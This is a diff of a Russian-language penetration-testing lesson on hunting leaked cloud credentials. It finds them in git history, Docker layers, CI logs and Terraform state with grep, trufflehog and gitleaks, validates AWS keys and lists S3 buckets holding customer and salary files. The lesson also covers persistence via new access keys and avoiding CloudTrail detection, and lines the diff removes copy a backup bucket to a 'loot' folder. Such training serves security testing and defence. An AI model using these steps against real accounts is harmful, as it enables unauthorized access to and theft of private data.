@@ -14,200 +14,133 @@ useful_for:
 estimated_minutes: 40
 summary: "Ключи утекают из репозиториев, CI-логов, Docker-образов, .env и terraform-стейта. Учимся искать их автоматически, отличать валидные от мусора и безопасно проверять их объём."
 ---
-## Зачем этот урок
 
-Облачный ключ — это строка. Она попадает всюду, где есть текст: в `.env`, в историю коммитов, в слои Docker-образа, в terraform-стейт, в логи CI, в ноутбуки. Поиск утечек — это OSINT плюс автоматизация: ручной `grep` не масштабируется. Здесь учимся находить ключи сканерами, отличать валидные от мусора и безопасно оценивать их объём.
+## Вопрос, с которого всё начинается
 
-## Откуда утекают креденшелы
+Ты тестируешь компанию и нашёл её публичный репозиторий на GitHub. В коде — обычный сайт, ничего секретного. Но облачные утечки редко лежат на виду: ключ доступа — это одна строка, которую кто-то закоммитил год назад и потом «удалил». Из файла она исчезла, а из истории — нет.
 
-- **Git-репозитории** — `.env`, `config.py`, тесты, **история коммитов** (ключ удалили из HEAD, но он остался в `git log -p`).
-- **CI/CD логи** — `echo $AWS_SECRET_ACCESS_KEY` при дебаге.
-- **Docker-образы** — слои с `ENV AWS_ACCESS_KEY_ID=...` (даже если удалены в позднем слое — остаются в раннем).
-- **Terraform state** — секреты в открытом виде.
-- **Бэкапы, дампы БД, Jupyter-ноутбуки, публичные бакеты, paste-сайты**.
+Вопрос урока: как найти такую строку, понять, живая ли она, и оценить, что она открывает — не нашумев при этом?
 
-## GitHub/GitLab: code search и dorks
+Опираемся на предыдущий урок: мы уже знаем, что в облаке атакуют права и конфигурацию, а ключ доступа — самый частый «вход». Здесь учимся его добывать.
 
-Dorks в веб-поиске:
+## Наш пример: публичный репозиторий
+
+Склонируем репозиторий цели целиком — с историей, а не только последний снимок.
 
 ```
-"AKIA" site:github.com org:target
-"aws_secret_access_key" site:github.com
-"-----BEGIN PRIVATE KEY-----" site:github.com target
-"password" filename:.env site:github.com
+$ git clone https://github.com/target/webapp.git
+$ cd webapp
 ```
 
-GitHub Code Search (нужен логин) индексирует код: `org:target AKIA`. GitLab имеет аналогичный поиск по группе. Также полезны `grep.app`, Sourcegraph, PublicWWW.
+Сначала ищем «в лоб» — по текущим файлам. Секрет-сканер ищет по шаблонам: у каждого провайдера ключ выглядит узнаваемо. Например, у AWS **access key** (идентификатор ключа, не секрет) начинается с `AKIA`.
 
-## trufflehog: установка и режимы
-
-Сканирует файловые системы, репозитории и историю коммитов на сотни типов секретов и умеет **верифицировать** ключи живым вызовом:
-
-```bash
-# Локальная папка
-trufflehog filesystem /path/to/repo --only-verified
-
-# Публичный git-репозиторий (включая всю историю)
-trufflehog git https://github.com/target/repo --only-verified
-
-# GitHub-организация целиком (нужен токен)
-trufflehog github --org=target --token=ghp_xxx
-
-# S3-бакет
-trufflehog s3 --bucket=victim
+```
+$ grep -rE 'AKIA[0-9A-Z]{16}' .
+(пусто)
 ```
 
-Флаг `--only-verified` критичен: он отсеивает мёртвые строки и оставляет рабочие ключи.
+Пусто. Многие на этом останавливаются и делают вывод «чисто». Это ошибка №1.
 
-## gitleaks
+## Шаг 1: ключ в истории коммитов
 
-```bash
-gitleaks detect --source /path/to/repo --report-format json --report-path leaks.json
-gitleaks detect --source . --log-opts="--all"   # вся история
-gitleaks protect --staged                        # pre-commit
+Git помнит всё. Команда `git log -p` показывает каждое изменение с содержимым, а `--all` — по всем веткам. Прогоним историю через grep:
+
+```
+$ git log -p --all | grep -Ei 'AKIA|aws_secret|BEGIN (RSA|OPENSSH) PRIVATE'
++aws_access_key_id = AKIAIOSFODNN7EXAMPLE
++aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 ```
 
-Gitleaks работает по regex-правилам, хорош для pre-commit и аудита. Правила расширяются через `.gitleaks.toml`.
+Вот они. Кто-то добавил файл с ключами в коммите `a1b2c3d`, потом удалил — но строка осталась в истории. Теперь у нас есть две вещи: **идентификатор** `AKIA...` (он не секретный) и **секрет** `wJalr...` (им подписываются запросы к AWS).
 
-## .env, Terraform state, Docker-образы
+## Шаг 2: автоматизируем — trufflehog
 
-```bash
-# Docker-образ: ищем ENV с секретами во всех слоях
-docker save target:latest -o img.tar && mkdir img && tar -xf img.tar -C img
-for layer in img/*/layer.tar; do tar -xf "$layer" -C ./out 2>/dev/null; done
-grep -rEi 'AKIA|SECRET|PASSWORD|TOKEN' ./out
+Ручной `grep` не масштабируется: репозиториев много, шаблонов сотни. Для этого есть **trufflehog** — сканер, который ищет секреты в файлах, репозиториях и их истории.
 
-# Terraform state: все чувствительные значения
-jq '.. | objects | select(has("access_key") or has("secret_key") or has("password"))' terraform.tfstate
+```
+$ trufflehog git https://github.com/target/webapp --only-verified
+🐷🔑🐷  Found verified result 🐷🔑🐷
+Detector Type: AWS
+Raw: AKIAIOSFODNN7EXAMPLE
 ```
 
-Terraform state особенно ценен: содержит значения **всех** ресурсов, включая `random_password`, `aws_iam_access_key`, строки подключения к БД.
+Флаг `--only-verified` критичен: trufflehog не просто находит строку, а **проверяет её живым вызовом** к провайдеру. Остаются только рабочие ключи — мёртвых совпадений в выводе нет.
 
-## Форматы ключей и валидация
+Второй инструмент — **gitleaks**, он работает по regex-правилам и удобен для локального аудита и pre-commit:
 
-| Провайдер | Идентификатор | Признак |
-|-----------|---------------|---------|
-| AWS access key | `AKIA`/`ASIA` + 16 символов | `AKIA[0-9A-Z]{16}` |
-| GCP service account | JSON с `"type": "service_account"` | поле `private_key` |
-| Azure | client_id + client_secret + tenant_id | `AZURE_CLIENT_SECRET` |
-| Generic | `-----BEGIN RSA PRIVATE KEY-----` | PEM |
-
-**Никогда не доверяйте regex** — проверяйте ключ живым вызовом:
-
-```bash
-AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
-gcloud auth activate-service-account --key-file=sa.json && gcloud projects list
+```
+$ gitleaks detect --source . --log-opts="--all" --report-format json --report-path leaks.json
 ```
 
-## Что делать с найденными ключами
+## Шаг 3: не верим сканеру — проверяем сами
 
-1. **Scope check** — чей аккаунт и насколько широки права:
-   ```bash
-   aws sts get-caller-identity
-   enumerate-iam --access-key AKIA... --secret-key ...
-   ```
-2. **Задокументировать** — сохранить в engagement state, пометить источник.
-3. **Не «шуметь»** — не запускайте `aws ec2 describe-*` по всему региону, это палится в CloudTrail.
-4. **Идти к эскалации** — `cloud-privesc-iam`.
+Даже `--only-verified` — это чужой вывод. Прежде чем строить план, подтверждаем ключ вручную и одним вызовом узнаём, **чей он**. В AWS для этого есть `sts get-caller-identity` — «кем я представился?».
 
-## Автоматизация и OPSEC
-
-```bash
-# Обход всех репозиториев организации
-trufflehog github --org=target --token=ghp_xxx --only-verified --json > leaks.json
-# Мониторинг новых утечек (регулярный прогон)
-gitleaks detect --source ./repo --log-opts="--all" --report-format json
+```
+$ export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+$ aws sts get-caller-identity
+{
+    "UserId": "AIDAEXAMPLEUSERID",
+    "Account": "123456789012",
+    "Arn": "arn:aws:iam::123456789012:user/ci-deploy"
+}
 ```
 
-Верификация ключа — это уже активное действие (видно в логах провайдера). Минимизируйте: один `get-caller-identity` вместо десятков вызовов.
+Читаем: ключ принадлежит пользователю `ci-deploy` в аккаунте `123456789012`. **ARN** — это идентификатор ресурса в AWS, его читают по частям: `iam` — сервис управления правами, `123456789012` — аккаунт, `user/ci-deploy` — пользователь. Имя `ci-deploy` намекает, что это сервисная учётка для пайплайна — такие часто имеют широкие права.
 
-## Разобранный пример: репозиторий → ключ → бакет
+## Шаг 4: что ключу разрешено
 
-1. Находим публичный репозиторий цели, клонируем.
-2. `trufflehog git <url> --only-verified` → валидный AWS-ключ.
-3. `aws sts get-caller-identity` → аккаунт `123456789012`, роль `ci-deploy`.
-4. `enumerate-iam` → права на S3 и `iam:CreateAccessKey`.
-5. `aws s3 ls` → бакет с бэкапами; `aws s3 sync s3://prod-backups ./loot`.
-6. Создаём персистентный ключ: `aws iam create-access-key --user-name ci-deploy` (если политика разрешает).
+Теперь надо понять объём прав. Быстрее всего — перечислить то, к чему ключ имеет доступ. Начнём с хранилищ (S3):
 
-## Частые ошибки
-
-- **Проверять только HEAD.** Ключ в истории коммитов — самый частый случай.
-- **Доверять regex без валидации.** Много ложных срабатываний.
-- **Шумно проверять.** Массовые API-вызовы палят вас в CloudTrail/GuardDuty.
-- **Забыть про слои Docker.** Удалённый в позднем слое ENV остаётся в раннем.
-- **Не смотреть terraform.tfstate.** Там пароли в открытом виде.
-
-## Что делать дальше / решение
-
-Практика: на учебном репозитории с `.env` прогоните `trufflehog filesystem . --only-verified`, затем `git log -p --all | grep -Ei 'AKIA|secret'`. Дальше — `cloud-cicd-secrets` (секреты в пайплайнах), `cloud-privesc-iam` (эскалация от ключа).
-
-## Секреты в GitHub Actions и других CI
-
-Помимо репозиториев, ключи утекают из CI-логов и конфигов. В GitHub Actions секреты маскируются в логах, но кодирование (`base64`) обходит маску. Проверьте артефакты workflow (`actions/upload-artifact`), кэш зависимостей и вывод `env`. В GitLab CI — `.gitlab-ci.yml` с `variables`, артефакты job, кэш. Часто секрет лежит в переменной и печатается при `set -x`.
-
-## Автоматизация сканирования
-
-```bash
-# Массово по организации (GitHub)
-trufflehog github --org=target --token=ghp_xxx --only-verified --json > leaks.json
-jq -r 'select(.Verified==true) | [.DetectorName,.Raw] | @tsv' leaks.json
-
-# Локально по всем репозиториям
-for r in repos/*; do gitleaks detect --source "$r" --log-opts="--all" --report-path "$(basename $r).json"; done
+```
+$ aws s3 ls
+2024-03-11 10:12:33 mycompany-backups
+2024-05-02 08:44:01 mycompany-internal-data
 ```
 
-Для непрерывного мониторинга — `trufflehog` в cron или GitHub Action с уведомлением.
+Два бакета видны. Смотрим внутрь:
 
-## Больше форматов и признаков
-
-| Тип | Признак | Комментарий |
-|-----|---------|-------------|
-| AWS session key | `ASIA` + 16 | временный, с токеном |
-| Slack token | `xox[baprs]-` | доступ к workspace |
-| Stripe | `sk_live_` | платежи |
-| Google API key | `AIza` + 35 | может быть ограничен |
-| JWT | `eyJ...` | проверяйте exp и alg |
-
-Сканеры покрывают сотни детекторов, но кастомные форматы придётся искать вручную (`grep -rE` по внутренним паттернам).
-
-## Практика: от ключа к данным
-
-```bash
-export AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=...
-aws sts get-caller-identity
-aws iam list-attached-user-policies --user-name <U>
-aws s3 ls
-aws secretsmanager list-secrets
+```
+$ aws s3 ls s3://mycompany-internal-data --recursive --human-readable | head
+2024-05-02 08:44:01   12.4 MiB customers.csv
+2024-05-02 08:44:01    1.1 MiB salaries.xlsx
 ```
 
-Если ключ принадлежит пользователю с `AdministratorAccess` — вы фактически админ аккаунта. Если ограничен — ищите `iam:CreateAccessKey`/`iam:PassRole` для эскалации.
+Ключ из старого коммита открыл персональные данные клиентов. Обрати внимание: мы ещё ничего не «взламывали» — просто использовали то, что кто-то забыл в истории.
 
-## Ротация и защита (для защитников)
+Чтобы понять полный объём, не перебирай всё подряд. Есть инструмент `enumerate-iam`, который аккуратно проверяет список API-вызовов и говорит, какие из них разрешены. Он полезнее «пальца в небо»: сразу видно, есть ли у ключа, например, `iam:CreateAccessKey` — право создать себе ещё один ключ (это персистентность) или `iam:PassRole` — право передать роль сервису (это путь к эскалации).
 
-Секрет, попавший в git, нужно считать скомпрометированным: ротация обязательна, удаление из HEAD бесполезно. Внедряйте pre-commit (`gitleaks protect`), secret scanning в CI, `trufflehog` в pipeline. Храните секреты в Secrets Manager/Vault, а не в env и файлах.
+## Шаг 5: другие места, откуда текут секреты
 
-## Секреты в GitLab CI и других источниках
+Репозиторий — не единственный источник. Секреты оседают везде, где есть текст:
 
-Помимо GitHub, ключи утекают из GitLab CI (`.gitlab-ci.yml`, артефакты job, кэш), из логов Travis/CircleCI/Jenkins, из ноутбуков Jupyter и из paste-сайтов. В GitLab проверьте `variables:` и вывод `set -x`. Отдельный источник — **публичные бакеты и S3-сайты** с бэкапами: `curl -s https://bucket.s3.amazonaws.com/?list-type=2`. Также ищите в `grep.app`, Sourcegraph, PublicWWW.
+- **CI-логи.** В GitHub Actions секреты маскируются, но `base64`-обёртка обходит маску, а `set -x` печатает переменные. Ищи в артефактах workflow и кэше.
+- **Docker-образы.** Слой с `ENV AWS_SECRET_ACCESS_KEY=...` остаётся в образе, даже если в позднем слое переменную удалили. Достаём слои: `docker save target:latest -o img.tar`, распаковываем и `grep -rEi 'AKIA|SECRET|TOKEN' ./out`.
+- **Terraform state.** Файл `terraform.tfstate` хранит значения всех ресурсов в открытом виде, включая пароли БД:
+  ```
+  $ jq '.. | objects | select(has("secret_key") or has("password"))' terraform.tfstate
+  ```
+- **Публичные бакеты, дампы БД, Jupyter-ноутбуки, paste-сайты.**
 
-## Таблица приоритетов находок
+## Что мы теперь знаем
 
-| Находка | Ценность | Первое действие |
-|---------|----------|-----------------|
-| AWS `AKIA`/`ASIA` | высокая | `sts get-caller-identity` |
-| GCP SA JSON | высокая | `gcloud auth activate-service-account` |
-| Azure client_secret | высокая | `az login --service-principal` |
-| `.env` с БД | средняя | проверить доступ к БД |
-| PEM-ключ | средняя | определить, где применим |
+1. Ключ — это идентификатор + секрет; идентификатор (`AKIA...`) не секретный, секрет подписывает запросы.
+2. Удаление секрета из файла не помогает — он остаётся в истории Git, слоях образов, логах CI и terraform-стейте.
+3. Искать надо автоматически (`trufflehog`, `gitleaks`), но валидность подтверждать вручную.
+4. `--only-verified` оставляет только рабочие ключи — это экономит время.
+5. Первый вызов после находки — `sts get-caller-identity`: он не создаёт сущностей и почти не шумит.
 
-Проверяйте валидность до эскалации: мёртвый ключ тратит время, а «шумная» проверка палит вас.
+## На что смотреть дальше
 
-## Верификация без шума
-
-Один вызов `get-caller-identity` даёт аккаунт и роль, не создавая сущностей. Избегайте `list-*` по всему аккаунту на первом шаге. Для GCP `tokeninfo` показывает scope. Для Azure декодируйте JWT локально — это не оставляет следов в логах провайдера.
+- **Проверяй всю историю, а не HEAD.** Ключ в старом коммите — самый частый случай.
+- **Не доверяй regex без верификации.** Ложных срабатываний много.
+- **Не шуми.** Массовые `aws ec2 describe-*` по региону палятся в CloudTrail. Один `get-caller-identity` лучше десятка `list-*`.
+- **Смотри `iam:CreateAccessKey` и `iam:PassRole`.** Если ключ ограничен, это твои пути к эскалации.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Почему удаление ключа из текущего файла не защищает?"
@@ -226,23 +159,35 @@ aws secretsmanager list-secrets
     - "Включает GCP"
   answer: 1
   explanation: "Верификация отсеивает мёртвые совпадения и оставляет валидные секреты."
-- question: "Какое поле в GCP service account JSON — самое чувствительное?"
+- question: "Что из перечисленного НЕ является секретом?"
   options:
-    - "`client_email`"
-    - "`private_key`"
-    - "`project_id`"
-    - "`type`"
+    - "AWS secret access key"
+    - "AWS access key id (AKIA...)"
+    - "GCP private_key"
+    - "Azure client_secret"
   answer: 1
-  explanation: "`private_key` — приватный ключ для подписи токенов; это и есть секрет."
+  explanation: "Идентификатор ключа виден в логах и не секретен; запросы подписывает secret."
 - question: "Первый шаг после находки валидного AWS-ключа?"
   options:
     - "Сразу удалить все ресурсы"
-    - "Определить личность и объём прав (`sts get-caller-identity`, enumerate-iam)"
+    - "Определить личность и объём прав (`sts get-caller-identity`)"
     - "Опубликовать ключ"
     - "Перезагрузить инстанс"
   answer: 1
   explanation: "Сначала scope check, потом — по обстоятельствам."
+- question: "Где остаётся удалённый ENV-секрет из Docker-образа?"
+  options:
+    - "В раннем слое образа"
+    - "Только в реестре"
+    - "Нигде"
+    - "В DNS"
+  answer: 0
+  explanation: "Слои не перезаписываются: поздний слой лишь добавляет новый, старый остаётся."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-logging-detection`) мы посмотрим на обратную сторону: каждое наше действие с этим ключом попадёт в аудит-лог провайдера. Разберём, что именно логируется и как не засветиться. А пока запомни главное: секрет ищут в истории и артефактах, а валидность подтверждают одним тихим вызовом.
 
 ## Где пригодится
 
